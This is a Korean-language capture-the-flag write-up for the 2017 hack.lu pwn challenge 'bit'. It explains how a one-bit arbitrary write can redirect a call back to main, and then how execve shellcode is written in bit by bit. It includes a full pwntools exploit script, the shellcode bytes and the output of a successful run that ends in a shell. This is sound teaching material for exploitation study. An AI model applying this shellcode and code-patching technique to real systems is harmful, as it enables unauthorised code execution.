# 2017 hack.lu - [PWN] bit

## Key words

-

## Solution

문제 내용은 다음과 같습니다

```
signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  signed __int64 result; // rax@2
  _BYTE *v4; // rsi@5
  _BYTE *v5; // rax@5
  __int64 v6; // rsi@6
  __int64 v7; // [sp+1038h] [bp-8h]@1

  v7 = *MK_FP(__FS__, 40LL);
  if ( __isoc99_scanf("%lx:%u", &input_lx_601018, &input_u_601020) == 2 )
  {
    if ( (unsigned int)input_u_601020 <= 7 )
    {
      mprotect((void *)(input_lx_601018 & 0xFFFFFFFFFFFF1000LL), 0x1000uLL, 7);
      v4 = (_BYTE *)input_lx_601018;
      v5 = (_BYTE *)input_lx_601018;
      *(_BYTE *)input_lx_601018 ^= 1 << input_u_601020;
      *v4 = *v5;
      mprotect((void *)(input_lx_601018 & 0xFFFFFFFFFFFF1000LL), 0x1000uLL, 5);
      result = 0LL;
    }
    else
    {
      result = 0xFFFFFFFFLL;
    }
  }
  else
  {
    result = 0xFFFFFFFFLL;
  }
  v6 = *MK_FP(__FS__, 40LL) ^ v7;
  return result;
}
```

2개의 입력을 받고 해당 위치의 한바이트를 수정해주는데 `mprotect`를 이용하여 읽기, 쓰기 등의 모든 권한을 열어 두기 때문에 어디든지 쓰기가 가능합니다.

문제는 한 바이트만 변경을 해주고 종료가 되기 때문에 한번에 뭔가 익스를 할 수는 없고, 처음 입력을 이용하여 다시 main으로 돌아가 계속 임의 쓰기를 할 수 있도록 변경을 해 주어야 합니다.

제가 노린 지점은 2개의 mprotect 중 2번째 mprotect 위치 입니다. 해당 위치의 어셈을 보면 다음과 같습니다.

```
pwndbg> x/30i 0x400713
   0x400713:	call   0x400520 <mprotect@plt>
   0x400718:	mov    eax,0x0
   0x40071d:	mov    rsi,QWORD PTR [rbp-0x8]
   0x400721:	xor    rsi,QWORD PTR fs:0x28
   0x40072a:	je     0x400731
   0x40072c:	call   0x4004f0 <__stack_chk_fail@plt>
   0x400731:	leave  
   0x400732:	ret    
```

더 자세히 볼 부분은 `call 0x400520 <mprotect@plt>`부분입니다. 이 부분은 어셈 (5바이트) 으로 보면 다음과 같습니다.

```
pwndbg> x/16b 0x400713
0x400713:	0xe8	0x08	0xfe	0xff	0xff	0xb8	0x00	0x00
0x40071b:	0x00	0x00	0x48	0x8b	0x75	0xf8	0x64	0x48
```

`0xe8`은 call 명령을 의미하고 뒤로 `0xfffffe08`이 `mprotect`를 의미합니다. 이는 콜 테이블의 상대주소로 조금만 변경하면 main으로도 변경시킬 수 있습니다. 위 주소에서 `08`부분을 `28`로 변경하게 되면 main으로 되게 됩니다.

이를 위해서 `scanf` 입력을 `400714:5`로 하게 되면 `0x400714` 의 한바이트에 `1 << 5`를 하게 되면 `0xfffffe08` 값이 `0xfffffe28`이 되게 되고 이를 어셈으로 보면 다음과 같이 main을 호출하도록 변경됩니다.

```
pwndbg> x/10i 0x400713
   0x400713:	call   0x400540  ; <-- main 주소 (0x400540)
   0x400718:	mov    eax,0x0
   0x40071d:	mov    rsi,QWORD PTR [rbp-0x8]
   0x400721:	xor    rsi,QWORD PTR fs:0x28
   0x40072a:	je     0x400731
   0x40072c:	call   0x4004f0 <__stack_chk_fail@plt>
   0x400731:	leave  
   0x400732:	ret
```

이제 여러번 수정이 가능하기 때문에 main 뒤쪽에 64비트 쉘 코드를 넣고 마지막으로 다시 `0xfffffe28`을 `0xfffffe08`로 수정하게 되면 쉘 코드가 실행되고 쉘이 떨어 지게 됩니다.

여기서는 `mov eax, 0x0` 뒤쪽인 `0x40071d`부터 쉘 코드를 넣었습니다.

## Solution Code

```python
from pwn import *
import sys

def leak(addr, size, title=""):
	print "*** {} : {} ***".format(hex(addr), title)
	print hexdump(p.leak(addr, size), begin=addr, skip=False)

p = None
server = "flatearth.fluxfingers.net"
port = 1744
DEBUG = 0

if len(sys.argv) >= 2:
	DEBUG = 1
	p = process("./bit")
else:
	DEBUG = 0
	p = remote(server, port)


main = 0x400636
fix  = 0x40071d
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
code = "488b75f86448333425280000007405e8bffdffffc9c3662e0f1f84".decode("hex")

print "shellcode : ", shellcode.encode("hex")

p.sendline("400714:5")

if DEBUG != 0: leak(fix, 0x100, "fix")

# 40071d = 0x48
# 48  0 1 0 0 1 0 0 0
# 31  0 0 1 1 0 0 0 1
#p.sendline("40071d:0")

if DEBUG == 0:
	fix_data = code
else:
	fix_data = p.leak(fix, len(shellcode))

print fix_data.encode("hex")

for i in range(0, len(shellcode)):
	a = bin(ord(shellcode[i]))[2:]
	a = "0" * (8-(len(a)%8)) + a
	a = a[::-1]
	b = bin(ord(fix_data[i]))[2:]
	b = "0" * (8-(len(b)%8)) + b
	b = b[::-1]

	# 76543210
	# 00110001
	# 01001000

	for j in range(0, 8):
		if a[j] != b[j]:
			print "{}:{}".format(hex(fix+i), j)
			p.sendline("{}:{}".format(hex(fix+i), j))

p.sendline("{}:{}".format(hex(0x400714), 5))

#leak(fix, 0x100, "fix")

p.interactive()
```

## Result

```
hackability@ubuntu:~/ctfing/2017_hacklu/pwn/bit$ python sol_bit.py 1
[+] Starting local process './bit': pid 7390
shellcode :  31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05
*** 0x40071d : fix ***
0040071d  48 8b 75 f8  64 48 33 34  25 28 00 00  00 74 05 e8  │H·u·│dH34│%(··│·t··│
0040072d  bf fd ff ff  c9 c3 66 2e  0f 1f 84 00  00 00 00 00  │····│··f.│····│····│
0040073d  0f 1f 00 41  57 41 56 41  55 41 54 55  53 48 81 ec  │···A│WAVA│UATU│SH··│
0040074d  28 10 00 00  48 83 0c 24  00 48 81 c4  20 10 00 00  │(···│H··$│·H··│ ···│
0040075d  4c 8d 25 4c  06 20 00 48  8d 2d 4d 06  20 00 31 db  │L·%L│· ·H│·-M·│ ·1·│
0040076d  41 89 ff 49  89 f6 49 89  d5 4c 29 e5  48 c1 fd 03  │A··I│··I·│·L)·│H···│
0040077d  e8 36 fd ff  ff 48 85 ed  74 1f 66 0f  1f 84 00 00  │·6··│·H··│t·f·│····│
0040078d  00 00 00 4c  89 ea 4c 89  f6 44 89 ff  41 ff 14 dc  │···L│··L·│·D··│A···│
0040079d  48 83 c3 01  48 39 eb 75  ea 48 83 c4  08 5b 5d 41  │H···│H9·u│·H··│·[]A│
004007ad  5c 41 5d 41  5e 41 5f c3  90 66 2e 0f  1f 84 00 00  │\A]A│^A_·│·f.·│····│
004007bd  00 00 00 f3  c3 00 00 48  83 ec 08 48  83 c4 08 c3  │····│···H│···H│····│
004007cd  00 00 00 01  00 02 00 25  6c 78 3a 25  75 00 00 01  │····│···%│lx:%│u···│
004007dd  1b 03 3b 30  00 00 00 05  00 00 00 04  fd ff ff 7c  │··;0│····│····│···|│
004007ed  00 00 00 64  fd ff ff 4c  00 00 00 5a  fe ff ff a4  │···d│···L│···Z│····│
004007fd  00 00 00 64  ff ff ff c4  00 00 00 e4  ff ff ff 0c  │···d│····│····│····│
0040080d  01 00 00 14  00 00 00 00  00 00 00 01  7a 52 00 01  │····│····│····│zR··│
0040081d
488b75f86448333425280000007405e8bffdffffc9c3662e0f1f84
0x40071d:0
0x40071d:3
0x40071d:4
0x40071d:5
<... snip ...>
0x400734:1
0x400734:2
0x400734:3
0x400734:4
0x400734:7
0x400735:2
0x400735:4
0x400735:5
0x400736:4
0x400737:0
0x400737:7
[*] Switching to interactive mode
$ ls
bit  bit-331fce47417bf2194ad7b1e0a0d1da84.zip  core  sol_bit.py
```
